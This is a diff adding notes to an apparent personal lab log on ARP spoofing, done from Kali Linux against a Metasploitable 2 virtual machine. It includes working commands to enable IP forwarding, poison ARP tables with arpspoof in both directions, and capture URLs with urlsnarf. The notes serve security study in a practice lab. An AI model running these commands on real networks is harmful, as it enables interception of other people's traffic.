@@ -9,7 +9,16 @@
 ### Tools
 * dsniff, a package for tools such as arpspoof
 * netdiscover for IP/MAC discovery with ARP queries
+* urlsnarf for intercepting and extracting URLS
 
 ### Lab
 * Enable IP forwarding so that you can forward packets on behalf of someone else.
     * echo 1 > /proc/sys/net/ipv4/ip_forward
+* Spoofed the victim machine (Metasploitable 2) ARP table so that the Kali Linux machine is the router to which it sends its requests to
+  with arpspoof -i eth0 -t <VICTIM_IP> <ROUTER_IP>
+* Spoofed the router ARP table so that the Kali Linux machine is the victim machine to which is sends Metasploitable's responses to
+  with arpspoof -i eth0 -t <ROUTER_IP> <VICTIM_IP>
+* Opened a 3rd terminal to see intercepted packets from the metasploitable VM and the responses with urlsnarf.
+  
+  
+
